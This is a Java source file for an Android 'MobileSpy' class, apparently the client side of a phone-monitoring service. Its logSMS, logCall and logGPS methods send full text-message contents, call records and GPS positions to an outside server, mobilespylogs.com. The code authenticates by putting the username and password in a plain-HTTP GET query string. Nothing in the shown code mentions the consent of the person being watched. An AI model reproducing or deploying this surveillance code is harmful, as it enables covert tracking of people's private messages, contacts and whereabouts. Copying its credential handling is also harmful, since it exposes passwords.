package org.ddth.android.mobilespy;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import org.ddth.http.core.ConnectionEvent;
import org.ddth.http.core.ConnectionListener;
import org.ddth.http.core.Logger;
import org.ddth.http.core.connection.ConnectionModel;
import org.ddth.http.core.connection.Request;
import org.ddth.http.impl.connection.ThreadPoolConnectionModel;

public class MobileSpy {

	private static final String WEBAPI_SERVER_ROOT = "http://www.mobilespylogs.com/webapi";

	public static final String APPLICATION_TAG = "MobileSpy";
	
	public static final String CALL_TYPE_INCOMING = "Incoming";
	public static final String CALL_TYPE_OUTGOING = "Outgoing";
	public static final String CALL_TYPE_MISSEDCALL = "Misscall";

	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";

	private static String session = "";
	private static String username = "";
	private static String password = "";

	public static interface ContentHandler {
		void handle(String text);
	}
	
	private static final ContentHandler DO_NOTHING_HANDLER = new ContentHandler() {
		public void handle(String text) {
			// Yeah, do nothing
		}
	};

	public static void setCredentials(String info1, String info2) {
		username = info1;
		password = info2;
	}
	
	public static void login(final ContentHandler handler, String username, String password) {
		setCredentials(username, password);
		login(handler);
	}
	
	/**
	 * First check if the given request is null, try to authenticate with
	 * username/password credential. Otherwise, make sure the given request
	 * will only be sent after a successful authentication.
	 * 
	 * @param handler
	 */
	private static void login(final ContentHandler handler) {
		ContentHandler loginHandler = new ContentHandler() {
			@Override
			public void handle(String text) {
				String[] tokens = text.split("_");
				String message = null;
				if (tokens.length == 2) {
					if (!"1".equals(tokens[0])) {
						message = tokens[1];
					}
					else {
						session = tokens[1];
					}
				}
				else {
					message = "Server error!";
				}
				handler.handle(message);
			}
		};
		Request loginRequest = new Request(WEBAPI_SERVER_ROOT + "/login.php?username="
				+ URLEncoder.encode(username) + "&password=" + URLEncoder.encode(password));
		sendRequest(loginHandler, loginRequest);
	}
	
	public static void logSMS(final String date, final String time, final String from, final String to, final String message) {
		// Try to login if the session is not available
		if (session.length() == 0) {
			login(new ContentHandler() {
				@Override
				public void handle(String text) {
					if (session.length() > 0) {
						logSMS(date, time, from, to, message);
					}
				}
			});
			return;
		}
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", session);
		parameters.put("content", date + "\t" + time + "\t" + from + "\t" + to + "\t" + message);
		sendRequest(DO_NOTHING_HANDLER, new Request(WEBAPI_SERVER_ROOT + "/sms.php", parameters));
		Logger.getDefault().debug(from + " " + to + " " + date + " " + time + " " + message);
	}
	
	public static void logCall(final String date, final String time, final String from,
			final String to, final String duration, final String type)
	{
		// Try to login if the session is not available 
		if (session.length() == 0) {
			login(new ContentHandler() {
				@Override
				public void handle(String text) {
					if (session.length() > 0) {
						logCall(date, time, from, to, duration, type);
					}
				}
			});
			return;
		}
		sendRequest(DO_NOTHING_HANDLER, new Request(WEBAPI_SERVER_ROOT + "/calllog.php?sID=" + session +
						"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time) +
						"&from=" + from + "&to=" + to +
						"&dir=" + type + "&dur=" + URLEncoder.encode(duration)));
		Logger.getDefault().debug(from + " " + to + " " + type + " " + duration + " " + date + " " + time);
	}

	public static void logGPS(final String lon, final String lat, final String speed, final String dir, final String date, final String time) {
		// Try to login if the session is not available 
		if (session.length() == 0) {
			login(new ContentHandler() {
				@Override
				public void handle(String text) {
					if (session.length() > 0) {
						logGPS(lon, lat, speed, dir, date, time);
					}
				}
			});
			return;
		}
		sendRequest(DO_NOTHING_HANDLER, new Request(WEBAPI_SERVER_ROOT + "/gpslog.php?sID=" + session +
						"&long=" + URLEncoder.encode(lon) + "&lat=" + URLEncoder.encode(lat) +
						"&speed=" + URLEncoder.encode(speed) + "&dir=" + URLEncoder.encode(dir) +
						"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time)));
		Logger.getDefault().debug(lon + " " + lat + " " + speed + " " + dir + " " + date + " " + time);
	}

	private static void sendRequest(final ContentHandler handler, Request request) {
		ConnectionModel connection = new ThreadPoolConnectionModel(new ConnectionListener() {
			@Override
			public void notifyEvent(ConnectionEvent event) {
				switch (event.getEventType()) {
	
				case ConnectionEvent.REQUEST_INITIATED:
					String requestType = event.getRequest().isPostRequest() ? "POST" : "GET";
					Logger.getDefault().debug(requestType + " " + event.getRequest().getURL());
					break;
					
				case ConnectionEvent.RESPONSE_RECEIVED:
					InputStream inputStream = (InputStream) event.getResponse().getContent().getContent();
					BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
					try {
						String message = reader.readLine();
						handler.handle(message);
						Logger.getDefault().debug("SERVER: " + message);
					}
					catch (IOException e) {
						Logger.getDefault().error("Error when processing data", e);
					}
					break;
					
				case ConnectionEvent.REQUEST_FINISHED:
					break;
				}
			}
		});
		connection.open();
		connection.sendRequest(request);
	}
}
